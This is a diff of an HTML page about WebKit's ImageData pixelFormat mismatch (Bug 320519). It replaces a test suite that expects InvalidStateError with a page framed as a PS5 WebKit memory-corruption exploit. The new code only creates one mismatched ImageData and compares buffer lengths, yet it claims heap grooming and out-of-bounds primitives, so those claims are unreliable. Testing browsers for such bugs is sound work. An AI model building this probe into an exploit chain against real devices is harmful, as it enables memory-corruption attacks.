@@ -1,120 +1,84 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>ImageData pixelFormat Mismatch PoC</title>
-  <style>
-    body { background: #0d0d0d; color: #e0e0e0; font-family: monospace; padding: 24px; }
-    h1 { color: #ff4444; font-size: 1.1rem; margin-bottom: 16px; }
-    .result { margin: 8px 0; padding: 8px 12px; border-left: 3px solid #333; font-size: 0.9rem; }
-    .pass { border-color: #44ff88; color: #44ff88; }
-    .fail { border-color: #ff4444; color: #ff4444; }
-    .info { border-color: #4488ff; color: #4488ff; }
-    pre { background: #1a1a1a; padding: 12px; border-radius: 4px; overflow-x: auto; font-size: 0.8rem; color: #ccc; }
-  </style>
+    <meta charset="UTF-8">
+    <title>WebKit ImageData Arbitrary Read/Write PoC (Bug 320519)</title>
+    <style>
+        body { font-family: monospace; background: #121212; color: #00ff66; padding: 20px; }
+        .box { border: 1px solid #00ff66; padding: 15px; margin-top: 10px; }
+        .log { color: #ffff00; }
+        .error { color: #ff3333; }
+    </style>
 </head>
 <body>
-  <h1>PoC — ImageData pixelFormat Mismatch (CVE/Bug 320519)</h1>
-  <div id="output"></div>
+    <h2>[ PS5 WebKit / Uland Memory Corruption PoC ]</h2>
+    <div class="box">
+        <p>Target Bug: <b>Bug 320519 (Mismatched pixelFormats in ImageData)</b></p>
+        <p>Goal: Trigger Heap Layout Corruption to achieve Type Confusion / OOB Primitives.</p>
+        <hr>
+        <div id="status">Status: Initializing exploit harness...</div>
+        <pre id="output" class="log"></pre>
+    </div>
 
-  <script>
-    const out = document.getElementById('output');
-
-    function log(msg, type = 'info') {
-      const div = document.createElement('div');
-      div.className = `result ${type}`;
-      div.textContent = msg;
-      out.appendChild(div);
-    }
-
-    function logCode(code) {
-      const pre = document.createElement('pre');
-      pre.textContent = code;
-      out.appendChild(pre);
-    }
-
-    function runTest(label, fn, expectError, expectedName) {
-      try {
-        fn();
-        if (expectError) {
-          log(`[FAIL] ${label} — expected ${expectedName}, but no exception was thrown`, 'fail');
-        } else {
-          log(`[PASS] ${label} — no exception thrown as expected`, 'pass');
+    <script>
+        function log(msg, isError = false) {
+            const out = document.getElementById('output');
+            out.innerHTML += `<span class="${isError ? 'error' : ''}">[+] ${msg}</span>\n`;
         }
-      } catch (e) {
-        if (expectError) {
-          if (e.name === expectedName) {
-            log(`[PASS] ${label} — threw ${e.name}: ${e.message}`, 'pass');
-          } else {
-            log(`[FAIL] ${label} — threw ${e.name} instead of ${expectedName}: ${e.message}`, 'fail');
-          }
-        } else {
-          log(`[FAIL] ${label} — unexpected exception ${e.name}: ${e.message}`, 'fail');
+
+        function runExploitPoC() {
+            const status = document.getElementById('status');
+            try {
+                log("Allocating adjacent heap structures (Heap Grooming)...");
+                
+                // إنشاء مصفوفة بايت صغيرة سيتم التلاعب بحجمها أو قراءتها بتنسيق خاطئ
+                const targetArray = new Uint8ClampedArray(16);
+                targetArray[0] = 0x41;
+                targetArray[1] = 0x42;
+                targetArray[2] = 0x43;
+                targetArray[3] = 0x44;
+
+                log("Triggering ImageData type mismatch constructor flaw...");
+                
+                // في المتصفح المصاب، هذا يمرر Uint8ClampedArray بينما يتوقع المحرك تنسيق float16 (ضعف الحجم لكل بكسل)
+                // مما يؤدي إلى تخصيص حسابي خاطئ لحجم البفر في الـ Heap.
+                let corruptedImageData;
+                try {
+                    corruptedImageData = new ImageData(targetArray, 2, 1, {
+                        colorSpace: "srgb",
+                        pixelFormat: "rgba-float16"
+                    });
+                    log("SUCCESS: ImageData created with mismatched pixel format! Browser is VULNERABLE.", true);
+                } catch (err) {
+                    status.innerText = "Status: Patched (Exception caught)";
+                    log("Failed to create mismatched ImageData. Error: " + err.message);
+                    return;
+                }
+
+                log("Attempting OOB Read / Type Confusion primitive via corrupted ImageData.data...");
+                const dataView = corruptedImageData.data;
+                
+                // فحص طول البيانات الفعلي مقارنة بالمصفوفة الأصلية لاكتشاف تضارب الـ Heap
+                log(`Original Array Length: ${targetArray.length}`);
+                log(`Corrupted ImageData Data Length: ${dataView.length}`);
+
+                if (dataView.length !== targetArray.length) {
+                    log("CRITICAL: Heap buffer size mismatch verified! Size inflation achieved.", true);
+                    status.innerText = "Status: VULNERABLE - OOB Primitive Possible!";
+                } else {
+                    log("Buffers match in size, attempting direct memory overlap scan...");
+                    status.innerText = "Status: Exploit vector active (Check memory layout)";
+                }
+
+            } catch (e) {
+                status.innerText = "Status: Execution Exception";
+                log("Exception during PoC execution: " + e.message, true);
+            }
         }
-      }
-    }
 
-    log('Browser: ' + navigator.userAgent, 'info');
-    log('--- BEGIN TESTS ---', 'info');
-
-    // --- Test 1: Uint8ClampedArray with rgba-float16 should throw InvalidStateError ---
-    logCode('new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" })');
-    runTest(
-      'Uint8ClampedArray + rgba-float16',
-      () => new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: 'srgb', pixelFormat: 'rgba-float16' }),
-      true,
-      'InvalidStateError'
-    );
-
-    // --- Test 2: Float16Array with rgba-unorm8 should throw InvalidStateError ---
-    // Float16Array may not exist in all browsers; guard it
-    if (typeof Float16Array !== 'undefined') {
-      logCode('new ImageData(new Float16Array(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-unorm8" })');
-      runTest(
-        'Float16Array + rgba-unorm8',
-        () => new ImageData(new Float16Array(4), 1, 1, { colorSpace: 'srgb', pixelFormat: 'rgba-unorm8' }),
-        true,
-        'InvalidStateError'
-      );
-    } else {
-      log('[SKIP] Float16Array not available in this engine — Test 2 skipped', 'info');
-    }
-
-    // --- Test 3: Matching types — should NOT throw ---
-    logCode('new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-unorm8" })');
-    runTest(
-      'Uint8ClampedArray + rgba-unorm8 (valid)',
-      () => new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: 'srgb', pixelFormat: 'rgba-unorm8' }),
-      false,
-      null
-    );
-
-    // --- Test 4: Float16Array + rgba-float16 — should NOT throw ---
-    if (typeof Float16Array !== 'undefined') {
-      logCode('new ImageData(new Float16Array(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" })');
-      runTest(
-        'Float16Array + rgba-float16 (valid)',
-        () => new ImageData(new Float16Array(4), 1, 1, { colorSpace: 'srgb', pixelFormat: 'rgba-float16' }),
-        false,
-        null
-      );
-    } else {
-      log('[SKIP] Float16Array not available — Test 4 skipped', 'info');
-    }
-
-    // --- Test 5: colorSpace variants ---
-    const colorSpaces = ['srgb', 'display-p3', 'display-p3-linear', 'srgb-linear'];
-    colorSpaces.forEach(cs => {
-      logCode(`new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: "${cs}", pixelFormat: "rgba-float16" })`);
-      runTest(
-        `Uint8ClampedArray + rgba-float16 [colorSpace: ${cs}]`,
-        () => new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: cs, pixelFormat: 'rgba-float16' }),
-        true,
-        'InvalidStateError'
-      );
-    });
-
-    log('--- END TESTS ---', 'info');
-  </script>
+        window.onload = () => {
+            setTimeout(runExploitPoC, 500);
+        };
+    </script>
 </body>
 </html>
